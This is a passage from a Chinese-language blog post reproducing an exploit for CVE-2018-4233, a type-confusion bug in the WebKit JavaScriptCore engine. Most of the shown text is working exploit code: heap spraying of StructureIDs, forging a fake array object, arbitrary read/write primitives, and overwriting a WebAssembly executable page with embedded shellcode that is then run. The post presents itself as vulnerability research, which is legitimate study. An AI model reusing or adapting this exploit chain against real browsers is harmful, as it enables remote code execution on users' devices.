class="keyword">var</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo,handler);</span><br><span class="line">   <span class="keyword">var</span> arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">   <span class="keyword">var</span> trigger = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line">   &#125;</span><br><span class="line">   trigger = <span class="literal">true</span>;</span><br><span class="line">   <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line">   <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="堆喷StructureID"><a href="#堆喷StructureID" class="headerlink" title="堆喷StructureID"></a>堆喷StructureID</h3><p>为了伪造一个数组对象，首先得拿到数组对象的StructureID，由于其是一串数字，并且对数组对象增加不同的属性即可使得StructureID不同，依次递增，因此，我们申请一些列不同原型的数组对象，然后随便猜测一个StructureID</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//制造N个对象，每个对象产生不一样的Structures，使得我们可以猜测一个可用的StructuresID</span></span><br><span class="line"><span class="keyword">var</span> structs = [];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sprayStructures</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> fake_elements_header = <span class="title function_">p64f</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;<span class="number">0xffff</span>;j++)</span><br><span class="line">         a[j] = <span class="number">23.33</span>;</span><br><span class="line">      a[<span class="string">&#x27;x&#x27;</span> + i] = fake_elements_header;</span><br><span class="line">      a.<span class="property">prop</span> = <span class="number">1.1</span>;</span><br><span class="line">      structs.<span class="title function_">push</span>(a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sprayStructures</span>();</span><br></pre></td></tr></table></figure>
<h3 id="伪造数组对象"><a href="#伪造数组对象" class="headerlink" title="伪造数组对象"></a>伪造数组对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> victim = structs[<span class="number">0x300</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jscell_double = <span class="title function_">p64f</span>(<span class="number">0x00000200</span>,<span class="number">0x01082007</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象的内存地址必须对齐，因此我们增加一个padding</span></span><br><span class="line"><span class="keyword">var</span> container = &#123;</span><br><span class="line">   <span class="attr">padding</span>:<span class="number">1.1</span>,</span><br><span class="line">   <span class="attr">jscell</span>:jscell_double,</span><br><span class="line">   <span class="attr">butterfly</span>:victim,</span><br><span class="line">   <span class="attr">butterflyIndexingMask</span>:<span class="title function_">p64f</span>(<span class="number">0x11111111</span>,<span class="number">0x0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> container_addr = <span class="title function_">addressOf</span>(container);</span><br><span class="line"><span class="keyword">var</span> hax = <span class="title function_">fakeObject</span>(container_addr[<span class="number">0</span>]+<span class="number">0x20</span>,container_addr[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>这里，我们将butterfly直接指向了victim，由于是对象，因此存储的是指针，所以通过hax，我们可以控制victim对象的整个结构，victim同样也是一个数组，我们这样做的目的是避免多次通过fakeObject和addressOf来伪造对象，因为这比较耗时并且可能影响内存布局，我们只需第一次伪造一个对象能够控制已有的对象，后面就可以方便操作，同样我们利用has和victim重新构造一个快速的NewAddressOf和NewFakeObject</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ArrayWithDouble</span></span><br><span class="line"><span class="comment">//var unboxed = [6.66,6.66,6.66];</span></span><br><span class="line"><span class="keyword">var</span> unboxed = structs[<span class="number">0x301</span>];</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="comment">//for (var j=0;j&lt;0xffff;j++)</span></span><br><span class="line">   <span class="comment">//a[j] = 23.33;</span></span><br><span class="line">a[<span class="string">&#x27;x0&#x27;</span>] = <span class="title function_">p64f</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// ArrayWithContiguous</span></span><br><span class="line"><span class="keyword">var</span> boxed = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line">boxed[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//让boxed和unboxed的Butterfly为同一地址</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">addressOf</span>(unboxed);</span><br><span class="line">hax[<span class="number">1</span>] = <span class="title function_">p64f</span>(d[<span class="number">0</span>],d[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">var</span> sharedButterfly = victim[<span class="number">1</span>];</span><br><span class="line">d = <span class="title function_">addressOf</span>(boxed);</span><br><span class="line">hax[<span class="number">1</span>] = <span class="title function_">p64f</span>(d[<span class="number">0</span>],d[<span class="number">1</span>]);</span><br><span class="line">victim[<span class="number">1</span>] = sharedButterfly;</span><br><span class="line"></span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(unboxed));</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(boxed));</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(victim));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">NewAddressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">   boxed[<span class="number">0</span>] = obj;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_">u64f</span>(unboxed[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">NewFakeObject</span>(<span class="params">addr_l,addr_h</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> addr = <span class="title function_">p64f</span>(addr_l,addr_h);</span><br><span class="line">   unboxed[<span class="number">0</span>] = addr;</span><br><span class="line">   <span class="keyword">return</span> boxed[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="构造read64和write64原语"><a href="#构造read64和write64原语" class="headerlink" title="构造read64和write64原语"></a>构造read64和write64原语</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr_l,addr_h,index = <span class="number">0</span></span>) &#123;</span><br><span class="line">   <span class="comment">//必须保证在vicim[-1]处有数据，即used slots和max slots字段，否则将导致读取失败</span></span><br><span class="line">   <span class="comment">//因此我们换用另一种方法，即利用property去访问</span></span><br><span class="line">   hax[<span class="number">1</span>] = <span class="title function_">p64f</span>(addr_l + <span class="number">0x10</span>,addr_h);</span><br><span class="line">   <span class="keyword">return</span> <span class="title class_">NewAddressOf</span>(victim.<span class="property">prop</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr_l,addr_h,double_val</span>) &#123;</span><br><span class="line">   hax[<span class="number">1</span>] = <span class="title function_">p64f</span>(addr_l + <span class="number">0x10</span>,addr_h);</span><br><span class="line">   victim.<span class="property">prop</span> = double_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我们不使用数组的方式去实现任意地址读写，因为数组的方式需要保证used slots和max slots字段满足要求，任意地址处不可能一直满足这个要求，因此我们使用外属性的方式，前面介绍过，这种外部属性就存储于butterfly前面，使用read的时候，最后需要加上NewAddressOf进行转换，因为属性的存储是按照前面介绍的这个</p>
<p>Pointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）<br>Double： [0001～FFFE][xxxx:xxxx:xxxx]<br>Integer： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）<br>False： [0000:0000:0000:0006]<br>True： [0000:0000:0000:0007]<br>Undefined： [0000:0000:0000:000a]<br>Null： [0000:0000:0000:0002]</p>
<p>方式存储的，显然我们读取的数据不满足这个要求，直接使用victim.prop返回的值会导致崩溃，当我们需要读取的数据是一些地址的时候，由于地址往往就48位，因此其高2字节为0，此时这个数据会被当成一个对象地址，因此为了拿到这个值，需要加上一层NewAddressOf，同理，在write64的时候如果写入的数据高2字节为0，需要加上一层NewFakeObject，由于我们写入的是double，就不需要，但是double数据会导致第7个字节的低4位为1，因此，我们不能一次性写入8个字节的完好数据，但是我们可以保证低4字节的数据被正确写入到目标处，因此，我们只需将数据拆分为4字节一组，然后包装为8字节的double，即可依次将数据完整的写入。</p>
<h3 id="劫持WASM，写shellcode"><a href="#劫持WASM，写shellcode" class="headerlink" title="劫持WASM，写shellcode"></a>劫持WASM，写shellcode</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6D</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x85</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7F</span>,<span class="number">0x03</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x2A</span>,<span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>([<span class="number">186</span>,<span class="number">114176</span>,<span class="number">46071808</span>,<span class="number">3087007744</span>,<span class="number">41</span>,<span class="number">2303198479</span>,<span class="number">3091735556</span>,<span class="number">487129090</span>,<span class="number">16777343</span>,<span class="number">608471368</span>,<span class="number">1153910792</span>,<span class="number">4132</span>,<span class="number">2370306048</span>,<span class="number">1208493172</span>,<span class="number">3122936971</span>,<span class="number">16</span>,<span class="number">10936</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">50887</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">1015760901</span>,<span class="number">3334948900</span>,<span class="number">1</span>,<span class="number">8632</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">181959</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">800606213</span>,<span class="number">795765090</span>,<span class="number">1207986291</span>,<span class="number">1210320009</span>,<span class="number">1210334349</span>,<span class="number">50887</span>,<span class="number">3343384576</span>,<span class="number">194</span>,<span class="number">3913728</span>,<span class="number">84869120</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> funcObj_addr = <span class="title function_">addressOf</span>(func);</span><br><span class="line"><span class="keyword">var</span> codeAddr = <span class="title function_">read64</span>(funcObj_addr[<span class="number">0</span>] + <span class="number">0x48</span>,funcObj_addr[<span class="number">1</span>],<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">read64</span>(codeAddr[<span class="number">0</span>],codeAddr[<span class="number">1</span>],<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;funcObj_addr=&quot;</span> + funcObj_addr[<span class="number">1</span>].<span class="title function_">toString</span>(<span class="number">16</span>) + funcObj_addr[<span class="number">0</span>].<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;codeAddr=&quot;</span> + codeAddr[<span class="number">1</span>].<span class="title function_">toString</span>(<span class="number">16</span>) + codeAddr[<span class="number">0</span>].<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;rwx_addr=&quot;</span> + rwx_addr[<span class="number">1</span>].<span class="title function_">toString</span>(<span class="number">16</span>) + rwx_addr[<span class="number">0</span>].<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换jit的shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++) &#123;</span><br><span class="line">   <span class="title function_">write64</span>(rwx_addr[<span class="number">0</span>] + i*<span class="number">4</span>,rwx_addr[<span class="number">1</span>],<span class="title function_">p64f</span>(shellcode[i],<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行shellcode</span></span><br><span class="line"><span class="title function_">func</span>();</span><br></pre></td></tr></table></figure>
<p>成功利用</p>
<img src="/ha1vk/2021/06/21/CVE-2018-4233/5.png" class="">

<h1 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h1><p>JSC的漏洞利用本质上与V8的漏洞利用相似，分析方法也类似，这些JS引擎的漏洞挖掘方法大多有着共同点。通过本次复现，又收获了许多新知识。</p>
<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/223494#h3-2">FireShell2020——从一道ctf题入门jsc利用</a><br><a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/www.auxy.xyz/_tutorial_Webkit_Exp_Tutorial_/index.html">Webkit Exploitation Tutorial</a><br><a target="_blank" rel="noopener" href="https://trac.webkit.org/wiki/JavaScriptCore#no1">wiki JavaScriptCore</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/jzyhywxz/article/details/78720620">【编译原理】中间代码（一）</a><br><a target="_blank" rel="noopener" href="https://ming1016.github.io/2018/04/21/deeply-analyse-javascriptcore/">深入剖析 JavaScriptCore</a><br><a href="">Attacking Client-Side JIT Compilers (v2) Samuel Groß (@5aelo)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/systemino/article/details/110248446?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">JavaScriptCore内部原理（一）：从JS源码到字节码的追踪</a><br><a target="_blank" rel="noopener" href="https://git.webkit.org/?p=WebKit.git;a=commitdiff;h=b602e9d167b2c53ed96a42ed3ee611d237f5461a;hp=7996e60888558ca8640cade6b1c0d6688b53ebc4">WebKit commitdiff</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/ha1vk/2021/05/28/llvm-pass-pwn/" rel="prev" title="LLVM PASS PWN">
      <i class="fa fa-chevron-left"></i> LLVM PASS PWN
    </a></div>
      <div class="post-nav-item">
    <a href="/ha1vk/2021/07/07/CVE-2020-9802/" rel="next" title="CVE-2020-9802 JSC CSE漏洞分析">
      CVE-2020-9802 JSC CSE漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSC%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">JSC引擎执行流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#clobberWorld"><span class="nav-number">2.2.</span> <span class="nav-text">clobberWorld</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSC%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="nav-number">2.3.</span> <span class="nav-text">JSC断点调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSC%E5%AF%B9%E8%B1%A1%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B"><span class="nav-number">2.4.</span> <span class="nav-text">JSC对象内存模型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.4.1.</span> <span class="nav-text">伪造对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BC%98%E5%8C%96%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">2.5.</span> <span class="nav-text">查看优化的数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC%E6%9E%84%E9%80%A0"><span class="nav-number">3.2.</span> <span class="nav-text">POC构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fakeObj%E5%92%8CaddressOf%E5%8E%9F%E8%AF%AD%E6%9E%84%E9%80%A0"><span class="nav-number">3.3.1.</span> <span class="nav-text">fakeObj和addressOf原语构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%96%B7StructureID"><span class="nav-number">3.3.2.</span> <span class="nav-text">堆喷StructureID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1"><span class="nav-number">3.3.3.</span> <span class="nav-text">伪造数组对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0read64%E5%92%8Cwrite64%E5%8E%9F%E8%AF%AD"><span class="nav-number">3.3.4.</span> <span class="nav-text">构造read64和write64原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81WASM%EF%BC%8C%E5%86%99shellcode"><span class="nav-number">3.3.5.</span> <span class="nav-text">劫持WASM，写shellcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/ha1vk/archives/">
        
          <span class="site-state-item-count">233</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/ha1vk/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/ha1vk/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/ha1vk/lib/anime.min.js"></script>
  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>

<script src="/ha1vk/js/utils.js"></script>

<script src="/ha1vk/js/motion.js"></script>


<script src="/ha1vk/js/schemes/muse.js"></script>


<script src="/ha1vk/js/next-boot.js"></script>




  




  
<script src="/ha1vk/js/local-search.js"></script>













  

  

</body>
</html>
